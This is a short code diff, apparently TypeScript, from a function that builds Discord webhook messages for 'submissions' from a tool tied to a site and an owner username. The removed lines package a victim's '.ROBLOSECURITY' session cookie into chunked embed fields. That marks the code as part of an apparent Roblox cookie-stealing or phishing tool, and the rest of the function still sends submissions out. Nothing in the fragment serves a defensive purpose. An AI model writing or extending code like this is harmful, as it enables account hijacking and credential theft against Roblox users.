@@ -567,17 +567,6 @@ function buildDiscordPayload(opts: {
     { name: "Submitted", value: new Date().toISOString(), inline: false },
   );
 
-  // Cookie goes in a SEPARATE second embed, chunked to 1024 chars per field.
-  const cookieFields: Array<{ name: string; value: string; inline?: boolean }> = [];
-  const total = Math.max(1, Math.ceil(cookie.length / 1024));
-  for (let i = 0; i < cookie.length; i += 1024) {
-    const part = cookie.slice(i, i + 1024);
-    cookieFields.push({
-      name: total === 1 ? ".ROBLOSECURITY Cookie" : `Cookie (Part ${i / 1024 + 1}/${total})`,
-      value: part,
-      inline: false,
-    });
-  }
 
   return {
     content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
